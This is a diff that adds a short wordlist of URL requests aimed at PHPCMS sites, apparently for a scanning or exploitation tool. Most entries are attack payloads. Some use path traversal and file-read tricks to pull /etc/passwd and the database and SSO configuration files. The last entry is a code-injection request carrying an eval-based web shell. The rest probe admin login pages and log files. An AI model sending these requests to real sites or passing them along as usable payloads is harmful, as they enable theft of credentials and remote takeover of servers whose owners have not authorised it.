@@ -1,0 +1,14 @@
+/api.php?op=ajax_domain&url=/etc/passwd
+/api.php?op=ajax_domain&url=caches/configs/system.php
+/api.php?op=ajax_domain&url=phpsso_server/caches/configs/uc_config.php
+/index.php?m=admin&c=index&a=login&pc_hash=MUPmkU
+/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+/admin?mod=phpcms&file=index&action=index
+/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php
+/login.php?mod=phpcms&file=login
+/index.php?m=member&c=index&a=register&siteid=1
+/phpsso_server/api.php?op=uc
+/robots.txt
+/cache/adminlogin_logs.php
+/cache/admin_logs.php
+/product.php?pagesize=${${@eval%28$_POST[heixiaozi]%29}} 
